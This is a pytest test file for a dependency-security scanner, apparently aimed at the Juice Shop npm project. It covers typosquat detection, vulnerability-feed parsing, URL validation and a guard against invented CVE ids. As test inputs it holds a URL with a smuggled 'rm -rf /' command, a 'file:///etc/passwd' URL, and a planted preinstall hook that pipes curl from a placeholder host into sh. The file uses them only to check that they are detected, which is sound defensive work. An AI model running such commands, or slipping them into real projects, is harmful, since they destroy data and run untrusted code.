import json
import subprocess
from pathlib import Path

import pytest

from guardian.agents.suspicious import levenshtein, lookalike
from guardian.agents.vulnerability import fixed_from_range, parse_npm_audit, parse_osv
from guardian.lockfile import resolve
from guardian.llm import unsupported_claims
from guardian.repo_fetch import FetchError, parse_github_url

ROOT = Path(__file__).resolve().parents[1]
BASE = ROOT / "reports"


# ---------- unit tests ----------
def test_node_resolution_prefers_nested_then_walks_up():
    pkgs = {"": {}, "node_modules/a": {}, "node_modules/b": {}, "node_modules/a/node_modules/b": {}}
    assert resolve(pkgs, "node_modules/a", "b") == "node_modules/a/node_modules/b"
    assert resolve(pkgs, "", "b") == "node_modules/b"
    assert resolve(pkgs, "node_modules/b", "a") == "node_modules/a"
    assert resolve(pkgs, "", "missing") is None


def test_typosquat_detection():
    assert levenshtein("expresss", "express") == 1
    assert lookalike("expresss", {"express", "@types/express", "cors"}) == "express"
    assert lookalike("totally-different", {"express"}) is None


def test_fixed_version_only_from_simple_upper_bound():
    assert fixed_from_range("<4.2.0") == "4.2.0"
    assert fixed_from_range(">=1.0.0 <1.2.3") == "1.2.3"
    assert fixed_from_range("*") is None


def test_npm_audit_parser_ignores_inherited_entries():
    audit = {"vulnerabilities": {
        "child": {"nodes": ["node_modules/child"], "via": [
            {"name": "child", "url": "https://github.com/advisories/GHSA-aaaa-bbbb-cccc",
             "severity": "high", "range": "<2.0.0", "title": "t"}]},
        "parent": {"nodes": ["node_modules/parent"], "via": ["child"]}}}
    lock = {"node_modules/child": {"version": "1.5.0"}, "node_modules/parent": {"version": "3.0.0"}}
    rows = parse_npm_audit(audit, lock)
    assert len(rows) == 1
    assert rows[0]["id"] == "GHSA-aaaa-bbbb-cccc" and rows[0]["installed_version"] == "1.5.0"
    assert rows[0]["fixed_version"] == "2.0.0"


def test_osv_parser_merges_alias_group():
    osv = {"results": [{"packages": [{
        "package": {"name": "crypto-js", "version": "3.3.0", "ecosystem": "npm"},
        "groups": [{"ids": ["CVE-2023-46233", "GHSA-xwcq-pm8m-c4vf"], "aliases": ["CVE-2023-46233"],
                    "max_severity": "9.1"}],
        "vulnerabilities": [
            {"id": "GHSA-xwcq-pm8m-c4vf", "aliases": ["CVE-2023-46233"], "summary": "weak PBKDF2",
             "database_specific": {"severity": "CRITICAL"},
             "affected": [{"package": {"name": "crypto-js"},
                           "ranges": [{"events": [{"introduced": "0"}, {"fixed": "4.2.0"}]}]}]},
            {"id": "CVE-2023-46233", "aliases": ["GHSA-xwcq-pm8m-c4vf"], "affected": []}]}]}]}
    rows = parse_osv(osv)
    assert len(rows) == 1
    r = rows[0]
    assert r["id"] == "GHSA-xwcq-pm8m-c4vf" and "CVE-2023-46233" in r["aliases"]
    assert r["severity"] == "critical" and r["fixed_version"] == "4.2.0"


@pytest.mark.parametrize("url,expected", [
    ("https://github.com/juice-shop/juice-shop", ("juice-shop", "juice-shop")),
    ("github.com/expressjs/express.git", ("expressjs", "express")),
    ("https://github.com/a/b/tree/main", ("a", "b")),
    ("expressjs/express", ("expressjs", "express")),
])
def test_github_url_accepted(url, expected):
    assert parse_github_url(url) == expected


@pytest.mark.parametrize("url", ["https://gitlab.com/a/b", "https://github.com/-x/y", "https://github.com/a",
                                 "https://github.com/a/b;rm -rf /", "file:///etc/passwd", ""])
def test_github_url_rejected(url):
    with pytest.raises(FetchError):
        parse_github_url(url)


def test_llm_guard_rejects_invented_ids():
    evidence = {"v": ["GHSA-xwcq-pm8m-c4vf", "crypto-js@3.3.0"]}
    assert unsupported_claims("GHSA-xwcq-pm8m-c4vf affects crypto-js@3.3.0", evidence) == []
    assert "CVE-2099-12345" in unsupported_claims("Also CVE-2099-12345", evidence)
    assert unsupported_claims("lodash@9.9.9 is bad", evidence) == ["lodash@9.9.9"]


# ---------- end-to-end checks on real scan output ----------
def need(path: Path):
    if not path.exists():
        pytest.skip(f"run the Guardian first: {path} missing")
    return json.loads(path.read_text(encoding="utf-8"))


def test_inventory_matches_lockfile():
    inv = need(BASE / "dependency_inventory.json")
    lock = need(ROOT / "target/juice-shop/package-lock.json")["packages"]
    assert len(inv["dependencies"]) == len([p for p in lock if p])
    assert inv["summary"]["direct"] > 0 and inv["summary"]["transitive"] > inv["summary"]["direct"]


def test_sbom_is_cyclonedx_and_matches_shipped_inventory():
    report = need(BASE / "evidence_report.json")
    sbom = report["sbom"]
    assert sbom["format"] == "CycloneDX"
    assert sbom["matched_inventory"] >= 0.95 * sbom["npm_component_count"] - 1


def test_every_vulnerability_comes_from_raw_scanner_output():
    vulns = need(BASE / "vulnerability_findings.json")
    raw_name = "npm-audit.json" if vulns["scanner"] == "npm-audit" else "osv-scanner.json"
    raw = (BASE / "raw" / raw_name).read_text(encoding="utf-8")
    assert vulns["total"] > 0
    for f in vulns["findings"]:
        assert f["id"] in raw, f"{f['id']} not in raw scanner output"
        assert f["package"] in raw
        if f["dependency_path"]:
            assert f["dependency_path"][0].startswith("juice-shop@")
            assert f["dependency_path"][-1] == f"{f['package']}@{f['installed_version']}"
    assert sum(bool(f["dependency_path"]) for f in vulns["findings"]) >= 0.9 * vulns["total"]


def test_transitive_trace_exists():
    report = need(BASE / "evidence_report.json")
    trace = report["trace"]
    assert trace and len(trace["shortest_path"]) >= 3
    assert trace["introduced_via_direct_dependencies"]


def test_clean_baseline_has_no_change_findings():
    susp = need(BASE / "suspicious_changes.json")
    assert susp["change_findings"] == 0


def test_anomaly_detector_on_real_git_diff(tmp_path):
    """Unit test only: a throwaway repo in a temp folder. Never written to reports/."""
    from guardian.agents.suspicious import detect
    from guardian.models import Inventory

    def git(*a):
        subprocess.run(["git", "-C", str(tmp_path), "-c", "user.name=t", "-c", "user.email=t@t", *a],
                       check=True, capture_output=True)
    pkg = {"name": "app", "version": "1.0.0", "dependencies": {"express": "^4.22.1"}, "scripts": {}}
    (tmp_path / "package.json").write_text(json.dumps(pkg), encoding="utf-8")
    git("init", "-q"); git("add", "-A"); git("commit", "-q", "-m", "base")
    pkg["dependencies"].update({"expresss": "1.0.0", "express": "^4.17.1"})
    pkg["scripts"]["preinstall"] = "curl -s https://example.invalid/x | sh"
    (tmp_path / "package.json").write_text(json.dumps(pkg), encoding="utf-8")
    out = tmp_path / "out"
    out.mkdir()
    inv = Inventory(repo=str(tmp_path), app_name="app", app_version="1.0.0")
    findings, _ = detect(tmp_path, out, inv, "HEAD")
    cats = {f.category for f in findings if f.kind == "change"}
    assert {"unexpected_dependency", "suspicious_package_name", "suspicious_version_change",
            "lifecycle_script"} <= cats


def test_fix_recommendations_flag_downgrades_and_nested_copies(tmp_path):
    from guardian.recommend import recommend
    raw = tmp_path / "raw"
    raw.mkdir()
    (raw / "npm-audit.json").write_text(json.dumps({"vulnerabilities": {
        "uuid": {"fixAvailable": {"name": "sequelize", "version": "3.30.0", "isSemVerMajor": True}},
        "jsonwebtoken": {"fixAvailable": {"name": "jsonwebtoken", "version": "9.0.3", "isSemVerMajor": True}},
        "express-jwt": {"fixAvailable": {"name": "express-jwt", "version": "8.5.1", "isSemVerMajor": True}},
        "marsdb": {"fixAvailable": False}}}), encoding="utf-8")
    base = {"title": "t", "scope": "prod", "aliases": [], "dependency_path": [], "evidence_source": "x"}
    findings = [
        dict(base, id="A", package="uuid", installed_version="8.3.2", severity="moderate", direct=False,
             introduced_via=["sequelize@6.37.8"], fixed_version="11.1.1"),
        dict(base, id="B", package="jsonwebtoken", installed_version="0.1.0", severity="critical", direct=False,
             introduced_via=["express-jwt@0.1.3"], fixed_version="9.0.0"),
        dict(base, id="C", package="marsdb", installed_version="0.6.11", severity="critical", direct=True,
             introduced_via=["marsdb@0.6.11"], fixed_version=None)]
    deps = [{"name": "sequelize", "version": "6.37.8", "type": "direct"},
            {"name": "express-jwt", "version": "0.1.3", "type": "direct"},
            {"name": "marsdb", "version": "0.6.11", "type": "direct"}]
    recs = {r["package"]: r for r in recommend(findings, deps, raw)}
    assert recs["uuid"]["action"] == "No safe automatic fix"          # 6.37.8 -> 3.30.0 is a downgrade
    assert recs["jsonwebtoken"]["headline"].startswith("Upgrade express-jwt 0.1.3 → 8.5.1")
    assert recs["marsdb"]["action"] == "No patch published"


def test_pdf_evidence_report_builds_from_real_outputs():
    need(BASE / "evidence_report.json")
    from guardian.pdf_report import build_pdf
    pdf = build_pdf(BASE)
    data = pdf.read_bytes()
    assert data.startswith(b"%PDF") and len(data) > 20_000


def test_every_finding_has_remediation():
    susp = need(BASE / "suspicious_changes.json")
    assert all(f["remediation"] for f in susp["findings"])
    recs = need(BASE / "fix_recommendations.json")
    vulns = need(BASE / "vulnerability_findings.json")
    assert {(r["package"], r["installed_version"]) for r in recs} == \
        {(f["package"], f["installed_version"]) for f in vulns["findings"]}
